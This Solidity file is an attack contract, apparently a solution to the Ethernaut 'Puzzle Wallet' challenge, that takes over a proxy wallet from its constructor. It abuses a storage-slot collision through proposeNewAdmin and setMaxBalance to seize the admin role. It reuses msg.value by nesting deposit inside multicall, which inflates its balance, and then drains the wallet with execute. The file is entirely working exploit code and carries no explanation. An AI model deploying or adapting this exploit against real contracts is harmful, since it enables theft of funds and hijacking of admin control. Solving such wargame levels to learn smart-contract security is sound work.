// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IPuzzleWallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function upgradeTo(address _newImplementation) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;
    function multicall(bytes[] calldata data) external payable;
    function whitelisted(address addr) external view returns (bool);
}

contract HackerPuzzleWallet {
    constructor(IPuzzleWallet wallet) payable {
        bytes[] memory depositSelector = new bytes[](1);

        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory multiData = new bytes[](2);
        multiData[0] = abi.encodeWithSelector(wallet.deposit.selector);
        multiData[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositSelector
        );

        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        require(wallet.whitelisted(address(this)));

        wallet.multicall{value: 0.001 ether}(multiData);

        wallet.execute(msg.sender, 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(wallet.admin() == msg.sender);
    }
}
